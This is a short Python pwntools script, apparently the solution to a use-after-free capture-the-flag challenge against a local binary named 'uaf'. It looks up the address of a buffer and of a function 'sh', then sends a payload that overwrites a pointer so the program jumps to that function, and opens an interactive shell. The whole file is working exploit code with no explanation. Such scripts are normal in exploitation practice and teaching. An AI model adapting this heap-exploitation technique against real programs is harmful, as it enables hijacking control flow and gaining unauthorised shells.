#!/usr/bin/env python
from pwn import *
p = process('./uaf')
elf = ELF('./uaf')
buf = elf.symbols['buf']
sh = elf.symbols['_Z2shv']
# gdb.attach(p)
payload = (p64(buf + 8) + p64(sh)).ljust(0x20)
p.send(payload)
p.interactive()
